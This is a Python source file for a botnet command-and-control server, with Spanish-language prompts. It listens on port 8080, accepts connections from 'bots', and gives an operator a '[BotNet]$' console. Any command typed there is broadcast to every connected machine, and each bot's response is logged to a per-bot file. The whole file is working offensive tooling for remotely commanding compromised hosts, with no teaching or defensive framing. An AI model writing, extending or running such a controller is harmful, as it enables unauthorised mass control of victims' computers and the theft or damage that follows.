import socket
import os
import queue
import threading
import time
from datetime import datetime
threads = []
contador = [1]
estado = [0]
principalQueue = queue.Queue()
directory = str(datetime.now())

def createDirectories():
    try:
        os.makedirs(directory)
    except Exception as ex:
        print("[-]",ex)
        os._exit(0)

def helpFunc():
    print("[+] AYUDA [+]\ncount \t-->\t Cantidad de bots conectados\nchange \t-->\t Cambiar el estado de salida de datos\nexit \t-->\t Cerrar todas las conexiones y salir del programa")

def count():
    print("[+] Hay un total de [{}] bots conectados!!\n".format(len(threads)))

def status():
    if(estado[0] == 0):
        print("[+] Todos los datos estan siendo guardado en archivos y se muestran en pantalla\n")
    else:
        print("[+] Todos los datos estan siendo uardados en archivos y no se muestran en pantalla\n")

def change():
    if(estado[0] == 0):
        estado[0] = 1
    else:
        estado[0] = 0
    status()

class  serverThread(threading.Thread):
    def __init__(self,queueServer):
        threading.Thread.__init__(self,name='Server')
        self.principalQueue = queueServer

    def run(self):
        while True:
            consoleSnd = str(input('[BotNet]$ '))
            if(consoleSnd == ""):
                pass

            elif(consoleSnd == "help"):
                helpFunc()

            elif(consoleSnd == "count"):
                count()

            elif(consoleSnd == "change"):
                change()

            elif(consoleSnd == "exit"):
                for i in range(len(threads)):
                    self.principalQueue.put(consoleSnd)
                    time.sleep(0.1)
                time.sleep(1)
                os._exit(0)

            else:
                print('[+] Enviando comando ::{}:: a {} bots'.format(consoleSnd,str(len(threads))))
                for i in range(len(threads)):
                    time.sleep(0.1)
                    self.principalQueue.put(consoleSnd)
                time.sleep(1.5)

class botThread(threading.Thread):
    def __init__(self,bot,botAddress,queue):
        self.botName = "Bot#"+str(contador)
        threading.Thread.__init__(self,name=self.botName)
        self.botIP = botAddress[0]
        self.botPort = botAddress[1]
        self.bot = bot
        self.botAddress = botAddress
        self.principalQueue = queue

    def run(self):
        contador[0] = contador[0] + 1
        nameBot = threading.current_thread().getName()
        print('[+] Conexion proveniente::{}:{} conectandon con {}'.format(str(self.botIP),str(self.botPort),nameBot))
        while True:
            executeBotCmd = self.principalQueue.get()
            try:
                #executeBotCmd+= "\n"
                self.bot.send(executeBotCmd.encode('utf-8'))
                ansBot = (self.bot.recv(1024)).decode('utf-8')
                archivo = open("./{}/{}.txt".format(directory,nameBot),"a")
                archivo.write("{}:\n{}".format(executeBotCmd,ansBot))
                archivo.close()
                if(estado[0] == 0):
                    print("{} Responde:\n".format(nameBot),ansBot)
            except Exception as ex:
                print('[-] Error al ejecutar el comando <{}>'.format(ex))
                break

def handler(port,host,queue):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverAddress = (host,port)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    server.bind(serverAddress)
    server.listen(10)
    print("[+] Conexion bot/servidor establecida por TCP <{}:{}>\n".format(host,str(port)));

    cmdServer = serverThread(queue);
    cmdServer.start()
    while True:
        (bot,botAddress) = server.accept()
        newBot = botThread(bot,botAddress,principalQueue)
        threads.append(newBot)
        newBot.start()

def main():
    localPort = 8080
    localAddress = '0.0.0.0'
    createDirectories()
    try:
        handler(localPort,localAddress,principalQueue)
    except Exception as ex:
        print("\nError al tratar de vincular::{}\n".format(str(ex)))

if __name__ == '__main__':
    main()


